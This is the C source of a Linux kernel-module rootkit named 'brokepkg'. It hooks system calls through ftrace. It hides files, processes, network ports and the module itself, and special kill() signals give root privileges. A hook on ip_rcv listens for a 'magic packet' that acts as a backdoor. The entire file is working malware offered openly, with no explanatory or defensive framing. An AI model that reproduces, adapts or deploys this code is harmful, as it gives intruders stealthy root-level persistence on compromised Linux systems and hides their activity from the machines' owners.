#include "hooks.h"
// backdoor header
#include "backdoor.h"
#include "config.h"
#include "getdents.h"
#include "give_root.h"
#include "module_hide.h"
#include "utils.h"

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
static t_syscall orig_getdents;
static t_syscall orig_getdents64;
static t_syscall orig_kill;
#else
typedef asmlinkage long (*orig_getdents_t)(unsigned int, struct linux_dirent *,
                                           unsigned int);
typedef asmlinkage long (*orig_getdents64_t)(unsigned int,
                                             struct linux_dirent64 *,
                                             unsigned int);
typedef asmlinkage long (*orig_kill_t)(pid_t, int);
orig_getdents_t orig_getdents;
orig_getdents64_t orig_getdents64;
orig_kill_t orig_kill;
#endif
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
static asmlinkage int (*orig_ip_rcv)(struct sk_buff *skb,
                                     struct net_device *dev,
                                     struct packet_type *pt,
                                     struct net_device *orig_dev);

static inline void tidy(void) {
  kfree(THIS_MODULE->sect_attrs);
  THIS_MODULE->sect_attrs = NULL;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
asmlinkage int hook_kill(const struct pt_regs *pt_regs) {
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
  pid_t pid = (pid_t)pt_regs->di;
  int sig = (int)pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
  pid_t pid = (pid_t)pt_regs->regs[0];
  int sig = (int)pt_regs->regs[1];
#endif
#else
asmlinkage int hook_kill(pid_t pid, int sig) {
#endif
  switch (sig) {
    case SIGHIDE:
      switch_module_hide();
      break;
    case SIGMODINVIS:
      switch_pid_hide(pid);
      break;
    case SIGROOT:
      give_root();
      break;
    case SIGPORT:
      switch_port_hide((unsigned short)pid);
      break;
    default:
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
      return orig_kill(pt_regs);
#else
      return orig_kill(pid, sig);
#endif
      break;
  }
  return 0;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
asmlinkage int hook_getdents64(const struct pt_regs *regs) {
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
  int fd = (int)regs->di;
  struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
  int fd = (int)regs->regs[0];
  struct linux_dirent *dirent = (struct linux_dirent *)regs->regs[1];
#endif
  int ret = orig_getdents64(regs);
#else
static asmlinkage int hook_getdents64(unsigned int fd,
                                      struct linux_dirent64 *dirent,
                                      unsigned int count) {
  int ret = orig_getdents64(fd, dirent, count);
#endif
  long error;
  struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
  struct inode *d_inode;
  unsigned long offset = 0;
  int isProc = 0;

  dirent_ker = kzalloc(ret, GFP_KERNEL);

  if ((ret <= 0) || (dirent_ker == NULL)) return ret;

  error = copy_from_user(dirent_ker, dirent, ret);
  if (error) goto done;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
  d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
  d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif

  if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)) isProc = 1;

  while (offset < ret) {
    current_dir = (void *)dirent_ker + offset;
    if (CONTAIN_HIDE_SEQUENCE(current_dir->d_name) ||
        NEED_HIDE_PROC(current_dir->d_name, isProc)) {
      if (current_dir == dirent_ker) {
        ret -= current_dir->d_reclen;
        memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
        continue;
      }

      previous_dir->d_reclen += current_dir->d_reclen;
    } else {
      previous_dir = current_dir;
    }

    offset += current_dir->d_reclen;
  }

  error = copy_to_user(dirent, dirent_ker, ret);
  if (error) goto done;

done:

  kfree(dirent_ker);
  return ret;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
asmlinkage int hook_getdents(const struct pt_regs *regs) {
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
  int fd = (int)regs->di;
  struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
  int fd = (int)regs->regs[0];
  struct linux_dirent *dirent = (struct linux_dirent *)regs->regs[1];
#endif
  int ret = orig_getdents(regs);
#else
static asmlinkage int hook_getdents(unsigned int fd,
                                    struct linux_dirent *dirent,
                                    unsigned int count) {
  int ret = orig_getdents(fd, dirent, count);
#endif
  struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
  };
  long error;
  int isProc = 0;
  unsigned long offset = 0;

  struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
  struct inode *d_inode;

  dirent_ker = kzalloc(ret, GFP_KERNEL);

  if ((ret <= 0) || (dirent_ker == NULL)) return ret;

  error = copy_from_user(dirent_ker, dirent, ret);
  if (error) goto done;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
  d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
  d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif

  if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)) isProc = 1;

  while (offset < ret) {
    current_dir = (void *)dirent_ker + offset;

    if (CONTAIN_HIDE_SEQUENCE(current_dir->d_name) ||
        NEED_HIDE_PROC(current_dir->d_name, isProc)) {
      if (current_dir == dirent_ker) {
        ret -= current_dir->d_reclen;
        memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
        continue;
      }
      previous_dir->d_reclen += current_dir->d_reclen;
    } else {
      previous_dir = current_dir;
    }

    offset += current_dir->d_reclen;
  }

  error = copy_to_user(dirent, dirent_ker, ret);
  if (error) goto done;

done:
  kfree(dirent_ker);
  return ret;
}

static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v) {
  long ret;
  struct sock *sk = v;

  if (sk != (struct sock *)0x1) {
    if (port_is_hidden(sk->sk_num)) return 0;
  }

  ret = orig_tcp4_seq_show(seq, v);
  return ret;
}

static asmlinkage long hook_tcp6_seq_show(struct seq_file *seq, void *v) {
  long ret;
  struct sock *sk = v;

  if (sk != (struct sock *)0x1) {
    if (port_is_hidden(sk->sk_num)) return 0;
  }

  ret = orig_tcp6_seq_show(seq, v);
  return ret;
}

asmlinkage int hook_ip_rcv(struct sk_buff *skb, struct net_device *dev,
                           struct packet_type *pt,
                           struct net_device *orig_dev) {
  if (magic_packet_parse(skb)) {
    return orig_ip_rcv(skb, dev, pt, orig_dev);
  };
  return 0;
}

static struct ftrace_hook hooks[] = {
    HOOK_SYSCALL("sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK_SYSCALL("sys_getdents", hook_getdents, &orig_getdents),
    HOOK_SYSCALL("sys_kill", hook_kill, &orig_kill),
    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hook_tcp6_seq_show, &orig_tcp6_seq_show),
    HOOK("ip_rcv", hook_ip_rcv, &orig_ip_rcv),
};

static int __init rootkit_init(void) {
  int err;
  err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
  if (err) return err;

  PR_INFO("brokepkg now is runing\n");
#ifndef DEBUG
  module_hide();
#endif
  tidy();

  return 0;
}

static void __exit rootkit_exit(void) {
  fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
  PR_INFO("brokepkg unloaded, my work has completed\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("R3tr074");
MODULE_DESCRIPTION("Rootkit");
MODULE_VERSION("0.8");
